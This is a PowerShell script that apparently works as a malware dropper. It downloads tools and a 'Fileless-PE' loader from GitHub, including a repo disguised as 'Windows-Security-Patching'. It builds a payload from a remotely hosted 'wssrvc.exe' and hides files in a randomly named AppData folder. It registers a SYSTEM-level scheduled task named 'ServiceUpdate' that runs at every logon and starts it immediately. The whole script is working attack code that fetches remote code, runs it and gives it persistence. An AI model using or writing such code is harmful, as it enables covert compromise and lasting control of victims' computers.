# Set error action preference to stop on errors
$ErrorActionPreference = "Stop"

# Get AppData path
$AppDataPath = $env:APPDATA

# Generate random string for filepath
$chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
$randomString = -join ($chars | Get-Random -Count 10)
Write-Host "Generated random string: $randomString"
$FolderName = $randomString

# Define paths for downloaded executables and scripts
$serviceUIPath = Join-Path $AppDataPath "ServiceUI.exe"
$unzipPath = Join-Path $AppDataPath "unzip.exe"
$mainZipPath = Join-Path $AppDataPath "main.zip"
$pythonZipPath = Join-Path $AppDataPath "python-3.14.0-embed-amd64.zip"
$filelessPEDir = Join-Path $AppDataPath $FolderName "Fileless-PE-main"
$wssrvcPyPath = Join-Path $filelessPEDir "wssrvc.py"
$filelessPEPyPath = Join-Path $filelessPEDir "Fileless-PE.py"
$pythonExePath = Join-Path $filelessPEDir "python.exe"
$pythonwExePath = Join-Path $filelessPEDir "pythonw.exe"

# Check for ServiceUI.exe, download if not present
if (-not (Test-Path "C:\Program Files\Microsoft Deployment Toolkit\Templates\Distribution\Tools\x64\ServiceUI.exe")) {
    Write-Host "ServiceUI.exe not found in MDT path. Downloading..."
    Invoke-WebRequest -Uri "https://github.com/xxoo-d/Windows-Security-Patching/raw/refs/heads/main/ServiceUI.exe" -OutFile $serviceUIPath -UseBasicParsing
} else {
    $serviceUIPath = "C:\Program Files\Microsoft Deployment Toolkit\Templates\Distribution\Tools\x64\ServiceUI.exe"
    Write-Host "ServiceUI.exe found in MDT path."
}

Write-Host "Downloading Unzip.exe..."
Invoke-WebRequest -Uri "https://github.com/xxoo-d/Windows-Security-Patching/raw/refs/heads/main/unzip.exe" -OutFile $unzipPath -UseBasicParsing

Write-Host "Downloading Fileless-PE loader repo..."
Invoke-WebRequest -Uri "https://github.com/malwarekid/Fileless-PE/archive/refs/heads/main.zip" -OutFile $mainZipPath -UseBasicParsing

# Create directory for Fileless-PE and unzip
New-Item -ItemType Directory -Path $filelessPEDir -Force
& $unzipPath -d (Join-Path $AppDataPath $FolderName) $mainZipPath

Write-Host "Downloading Python for Windows..."
Invoke-WebRequest -Uri "https://www.python.org/ftp/python/3.14.0/python-3.14.0-embed-amd64.zip" -OutFile $pythonZipPath -UseBasicParsing

# Unzip Python into Fileless-PE directory
& $unzipPath -d $filelessPEDir $pythonZipPath

Write-Host "Generating payload..."
$payloadInput = "https://github.com/xxoo-d/Windows-Security-Patching/raw/refs/heads/main/wssrvc.exe`nexe`n$wssrvcPyPath"
$payloadInput | & $pythonExePath $filelessPEPyPath

Write-Host "Creating and executing scheduled task..."
$taskAction = "$serviceUIPath $pythonwExePath $wssrvcPyPath"
$taskExists = schtasks /query /tn ServiceUpdate | Select-String -Quiet "ServiceUpdate"
if ($taskExists) {
    Write-Host "Scheduled task 'ServiceUpdate' already exists. Deleting and recreating..."
    schtasks /delete /tn ServiceUpdate /f
}

# Create Scheduled task
$schtasksCommand = "/create /tn ServiceUpdate /tr `"$taskAction`" /sc onlogon /ru System /f"
Start-Process -FilePath "schtasks.exe" -ArgumentList $schtasksCommand -NoNewWindow -Wait

# Execute Scheduled task
Start-Process -FilePath "schtasks.exe" -ArgumentList "/run /tn ServiceUpdate" -NoNewWindow -Wait

Write-Host "PowerShell script execution complete."